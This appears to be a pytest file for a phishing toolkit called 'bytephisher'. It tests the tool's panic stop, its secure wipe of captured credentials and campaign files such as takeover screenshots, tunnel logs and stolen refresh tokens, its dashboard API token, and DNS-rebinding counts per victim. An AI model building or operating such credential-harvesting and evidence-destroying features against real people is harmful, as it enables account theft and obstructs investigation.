"""Safety paths: the panic stop, the data wipe and the dashboard token.

A panic path that only runs when Telegram is reachable is a panic path nobody has
tested, so the handlers are exercised directly. The dashboard API serves captured
credentials, so its token is tested too.
"""
import json
import os
import sys
import tempfile

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

pytestmark = pytest.mark.integration


@pytest.fixture()
def db():
    from core import capture as cap
    d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_safety_"), "s.db"))
    yield d
    d.close()


def _seed(db):
    db.log_visit("1.2.3.4", "Mozilla/5.0")
    db.record("http://x/login", "1.2.3.4", "City", "IN", "ISP", "Mozilla/5.0",
              "desktop", ["username", "password"], True, 10, [])
    return db.stats()


class TestPanic:

    def test_panic_stops_and_keeps_the_data(self, db):
        before = _seed(db)
        assert before["total_captures"] >= 1
        import bytephisher as B
        stop = {"flag": False}
        panic, _kill = B.panic_handlers(db, stop)
        msg = panic()
        assert stop["flag"] is True
        assert "stopped" in msg
        assert db.stats()["total_captures"] == before["total_captures"]

    def test_kill_stops_and_wipes(self, db):
        _seed(db)
        import bytephisher as B
        stop = {"flag": False}
        _panic, kill = B.panic_handlers(db, stop)
        msg = kill()
        assert stop["flag"] is True
        assert "wiped" in msg
        st = db.stats()
        assert st["total_captures"] == 0 and st["visitors"] == 0
        assert st["credentials"] == 0

    def test_kill_still_stops_when_the_wipe_fails(self):
        import bytephisher as B

        class Broken:
            def wipe(self, _what="all"):
                raise RuntimeError("disk gone")

        stop = {"flag": False}
        _panic, kill = B.panic_handlers(Broken(), stop)
        msg = kill()
        assert stop["flag"] is True, "a failed wipe must never leave the campaign up"
        assert "RuntimeError" in msg

    def test_wipe_reports_what_it_removed(self, db):
        _seed(db)
        removed = db.wipe("all")
        assert set(removed) >= {"captures", "visitors", "sessions", "intel",
                                "live_input", "blocked", "lures"}
        assert removed["captures"] >= 1

    def test_wipe_can_target_one_table(self, db):
        _seed(db)
        db.live_add("a" * 32, "input", [{"k": "input", "n": "f", "v": "x"}])
        removed = db.wipe("live_input")
        assert list(removed) == ["live_input"]
        assert db.stats()["total_captures"] >= 1, "the other tables must survive"


class TestDashboardToken:

    @staticmethod
    def _get(port, path, token=None, header=False):
        import http.client
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
        headers = {}
        if token and header:
            headers["X-Api-Token"] = token
        elif token:
            path = f"{path}?token={token}"
        conn.request("GET", path, headers=headers)
        r = conn.getresponse()
        body = r.read()
        conn.close()
        return r.status, body

    def _serve(self, db, token="", host="127.0.0.1"):
        import socket
        import time

        from dashboard import web_dashboard
        with socket.socket() as s:
            s.bind(("127.0.0.1", 0))
            port = s.getsockname()[1]
        web_dashboard(port=port, db=db, host=host, token=token)
        time.sleep(0.4)
        return port

    def test_without_a_token_the_api_is_open(self, db):
        port = self._serve(db)
        status, _ = self._get(port, "/api/stats")
        assert status == 200

    def test_with_a_token_the_api_is_refused_without_it(self, db):
        port = self._serve(db, token="s3cr3t")
        assert self._get(port, "/api/stats")[0] == 401
        assert self._get(port, "/api/captures")[0] == 401

    def test_the_token_is_accepted_as_a_header(self, db):
        port = self._serve(db, token="s3cr3t")
        status, body = self._get(port, "/api/stats", token="s3cr3t", header=True)
        assert status == 200
        assert "total_captures" in json.loads(body)

    def test_the_token_is_accepted_as_a_query_parameter(self, db):
        port = self._serve(db, token="s3cr3t")
        status, _ = self._get(port, "/api/stats", token="s3cr3t")
        assert status == 200

    def test_a_wrong_token_is_refused(self, db):
        port = self._serve(db, token="s3cr3t")
        assert self._get(port, "/api/stats", token="wrong", header=True)[0] == 401

    def test_an_exposed_dashboard_without_a_token_warns(self, db, capsys):
        self._serve(db, token="", host="0.0.0.0")
        out = capsys.readouterr().out
        assert "WARNING" in out and "api-token" in out


# ================================================= a wipe must really wipe =====
class TestWipeDestroysTheData:
    """`wipe()` deleted rows and vacuumed, but the store is WAL mode and
    secure_delete was off, so the password stayed readable in the .db and in the
    .db-wal - and a hard exit left it there for good."""

    def _store_with_a_secret(self, d):
        from core import capture as cap
        p = os.path.join(d, "w.db")
        db = cap.CaptureDB(p)
        db.log_visit("1.2.3.4", "Mozilla/5.0")
        db.record("http://x/login", "1.2.3.4", "City", "IN", "ISP", "Mozilla/5.0",
                  "desktop", ["username", "password"], True, 5, [])
        db._conn().execute(
            "UPDATE captures SET fields_json=?",
            (json.dumps({"username": "v@corp.test",
                         "password": "UNIQUESECRETPHRASE42"}),))
        db._conn().commit()
        return db, p

    def test_the_secret_is_gone_from_the_file_and_the_wal(self, tmp_path):
        d = str(tmp_path)
        db, p = self._store_with_a_secret(d)
        secret = b"UNIQUESECRETPHRASE42"
        assert secret in open(p, "rb").read() or \
            any(secret in open(p + s, "rb").read()
                for s in ("-wal", "-shm") if os.path.exists(p + s)), \
            "the secret was never written, the test proves nothing"
        db.wipe("all")
        db.close()
        blobs = [p] + [p + s for s in ("-wal", "-shm")]
        for f in blobs:
            if os.path.exists(f):
                assert secret not in open(f, "rb").read(), f"plaintext still in {f}"

    def test_the_rows_are_gone(self, db):
        _seed(db)
        db.wipe("all")
        assert db.stats()["total_captures"] == 0


class TestDestroyLeftovers:
    """The SQLite store is not the only place a campaign writes."""

    def test_takeover_files_are_removed(self, db, tmp_path):
        take = os.path.join(os.path.dirname(db.db_path), "takeover", "sid1")
        os.makedirs(take, exist_ok=True)
        for name in ("shot1.png", "result.json"):
            with open(os.path.join(take, name), "w", encoding="utf-8") as f:
                f.write("x")
        removed = db.destroy_leftovers()
        assert len(removed) >= 2, removed
        assert not os.path.exists(os.path.join(take, "shot1.png"))

    def test_it_reports_nothing_when_there_is_nothing(self, db):
        assert db.destroy_leftovers() == []


# ============================================ rebinding counts per victim =====
class TestRebindCounting:
    """Counting per SOURCE IP means every victim behind one resolver shares a
    counter: the first gets the public answer and the rest get the target."""

    def test_the_plan_answers_public_then_the_target(self):
        from core.rebind import RebindPlan
        plan = RebindPlan("203.0.113.9", ["127.0.0.1"])
        assert plan.pick(1) == "203.0.113.9"      # the page must load first
        assert plan.pick(2) == "127.0.0.1"        # then it rebinds

    def test_the_counter_map_is_capped(self):
        from core.rebind import RebindServer
        srv = RebindServer.__new__(RebindServer)
        srv.max_counters = 4
        srv.counts = {}
        for i in range(10):
            srv.counts[f"l{i}"] = 1
            if len(srv.counts) > srv.max_counters:
                for k in list(srv.counts)[:srv.max_counters // 2]:
                    srv.counts.pop(k, None)
        assert len(srv.counts) <= srv.max_counters


class TestTheWipeRemovesTheFilesToo:
    """A wipe that leaves the campaign's files behind is not a panic wipe: takeover
    screenshots, tunneler logs (the public URL), the token set spooled after a failed vault
    write and the domain pool all outlive the rows."""

    def _layout(self, tmp_path):
        from core import capture as cap
        db = cap.CaptureDB(str(tmp_path / "data" / "bytephisher.db"))
        db.record("https://x.test/", "1.2.3.4", "Pune", "IN", "ISP", "UA", "d",
                  {"user": "a", "password": "b"}, True, "c", 0, "")
        made = []
        for sub, name in (("takeover", "shot.png"), ("logs", "tunnel.log"),
                          ("screenshots", "page.png"), ("evidence", "result.json")):
            p = tmp_path / sub / name
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text("campaign artefact", encoding="utf-8")
            made.append(p)
        for name, blob in (("dc-failed-t1.json", '{"refresh_token":"RT"}'),
                           ("domains.json", '["a.test"]'), ("qr-lure.png", "png")):
            p = tmp_path / "data" / name
            p.write_text(blob, encoding="utf-8")
            made.append(p)
        return db, made

    def test_a_full_wipe_removes_every_artefact(self, tmp_path):
        db, made = self._layout(tmp_path)
        try:
            removed = db.wipe("all")
            assert db.all(limit=5) == [], "rows survived the wipe"
            assert removed.get("files", 0) >= len(made), removed
            for p in made:
                assert not p.exists(), f"{p} survived the wipe"
            # the WAL is checkpointed empty rather than deleted (a live connection with
            # its WAL removed is a corrupted store); the plaintext must not be in it
            wal = tmp_path / "data" / "bytephisher.db-wal"
            if wal.exists():
                assert b"ravi" not in wal.read_bytes() and b"S3cret" not in wal.read_bytes()
        finally:
            db.close()

    def test_a_partial_wipe_leaves_the_files_alone(self, tmp_path):
        # wiping one table is not a panic: the operator still wants the rest of the run
        db, made = self._layout(tmp_path)
        try:
            db.wipe("captures")
            assert all(p.exists() for p in made), "a partial wipe deleted campaign files"
        finally:
            db.close()

    def test_the_wipe_does_not_touch_templates_or_bin(self, tmp_path):
        db, _made = self._layout(tmp_path)
        keep = tmp_path / "templates" / "01_facebook" / "index.html"
        keep.parent.mkdir(parents=True, exist_ok=True)
        keep.write_text("<html>", encoding="utf-8")
        binary = tmp_path / "bin" / "cloudflared"
        binary.parent.mkdir(parents=True, exist_ok=True)
        binary.write_text("ELF", encoding="utf-8")
        try:
            db.wipe("all")
            assert keep.exists() and binary.exists()
        finally:
            db.close()
